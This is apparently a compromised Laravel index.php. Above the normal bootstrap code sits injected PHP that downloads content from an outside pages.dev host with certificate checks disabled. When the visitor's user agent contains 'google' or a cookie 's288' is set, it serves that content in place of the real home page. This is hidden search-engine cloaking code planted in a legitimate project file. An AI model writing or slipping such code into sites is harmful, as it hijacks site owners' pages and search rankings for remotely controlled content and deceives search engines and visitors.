<?php
error_reporting(0);

$lp = "https://demoouniv.pages.dev/id/index.txt"; // ganti link raw

$curl_connect=curl_init($lp);
	curl_setopt($curl_connect,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($curl_connect,CURLOPT_FOLLOWLOCATION,1);
	curl_setopt($curl_connect,CURLOPT_USERAGENT,"Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	curl_setopt($curl_connect,CURLOPT_SSL_VERIFYPEER,0);
	curl_setopt($curl_connect,CURLOPT_SSL_VERIFYHOST,0);
$content_data=curl_exec($curl_connect);

$asd=["bot","ahrefs","google"];
foreach($asd as $len){
	$nul = $len;
}
$alow=["85.92.66.150","81.19.188.236","81.19.188.235","85.92.66.149"];

if($_SERVER["REQUEST_URI"]=="/"){
	$agent=strtolower($_SERVER["HTTP_USER_AGENT"]);
	if(
		strpos($agent,$nul)or
		isset($_COOKIE["s288"])
		)
		{echo $content_data;
			die();}}

use Illuminate\Foundation\Application;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

// Determine if the application is in maintenance mode...
if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

// Register the Composer autoloader...
require __DIR__.'/../vendor/autoload.php';

// Bootstrap Laravel and handle the request...
/** @var Application $app */
$app = require_once __DIR__.'/../bootstrap/app.php';

$app->handleRequest(Request::capture());
